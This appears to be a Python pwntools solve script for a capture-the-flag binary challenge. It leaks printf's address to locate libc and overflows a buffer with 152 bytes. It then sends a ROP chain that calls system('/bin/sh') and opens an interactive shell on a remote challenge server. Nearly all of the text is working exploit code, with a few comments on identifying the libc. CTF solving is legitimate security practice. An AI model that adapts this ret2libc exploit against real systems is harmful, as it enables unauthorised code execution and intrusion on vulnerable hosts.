#!/usr/bin/env python2
from pwn import *
context(os="linux", arch="amd64")
context.terminal = ['zsh', '-e', 'sh', '-c']


def solve(_remote=True):

    challenge = ELF('./challenge')

    # We need to find same libc as the challenge machine, we used libc-database
    # Leaked printf from output 00007f63f4cbb800
    # https://github.com/niklasb/libc-database
    # $ ./find printf 800
    # $ ./download libc6_2.23-0ubuntu10_amd64

    libc = ELF('./libc.so.6')

    if _remote is False:
        #io = gdb.debug("./challenge", "b main")
        io = process('./challenge')
    else:
        io = remote('jh2i.com', 50005)

    printf_addr = io.recv()[48:64].strip()
    libc.address = int(printf_addr, 16) - libc.symbols['printf']

    # Create payload
    junk = 'A' * 152
    rop = ROP(libc)
    x = rop.system(next(libc.search('/bin/sh\x00')))
    payload = junk + str(rop)

    io.sendline(payload)
    io.interactive()
    io.recvuntil(0)


if __name__ == '__main__':
    solve(_remote=True)




























